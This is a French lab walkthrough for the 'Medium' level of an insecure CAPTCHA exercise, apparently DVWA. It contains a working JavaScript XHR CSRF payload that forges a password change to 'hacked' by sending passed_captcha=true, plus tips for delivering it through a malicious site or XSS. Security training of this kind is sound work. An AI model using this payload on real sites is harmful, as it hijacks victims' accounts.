# Niveau "Medium"

Voyons les modifications apportées à ce niveau "Medium" :

![](../../../../.gitbook/assets/0dd89966d796cc2958648f2b515f78e2.png)

L'étape de confirmation est toujours présente :

![](../../../../.gitbook/assets/a4ea88c03ec789f7e1c3282bd635ddeb.png)

La première requête ne semble pas différente :

![](../../../../.gitbook/assets/5e43f2e2e5a1587b4101ebc1d59a510e.png)

La seconde requête contient un nouveau paramètre nommé `passed_captcha` qui a pour valeur `true` :

![](../../../../.gitbook/assets/8cd98b3ca0d4afe92b6b2a1d70a95cf8.png)

Aucune difficulté pour contourner cette protection, on adapte sensiblement notre précédente requête **`XHR`** pouvant être utilisée pour une attaque CSRF :

```javascript
var xhr = new XMLHttpRequest();
xhr.open("POST", 'http://192.168.56.203/vulnerabilities/captcha/', true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.withCredentials = true;

xhr.onreadystatechange = function() {
  if (this.readyState === XMLHttpRequest.DONE && this.status === 200) {
    console.log(xhr.response);
  }
}

xhr.send("step=2&password_new=hacked&password_conf=hacked&passed_captcha=true&Change=Change");
```

{% hint style="info" %}
Pour l'exploitation de cette vulnérabilité, il suffit de reprendre le même principe que lors d'une attaque CSRF classique \(faire visiter un site malicieux à la victime, s'appuyer sur une faille XSS, etc\)
{% endhint %}

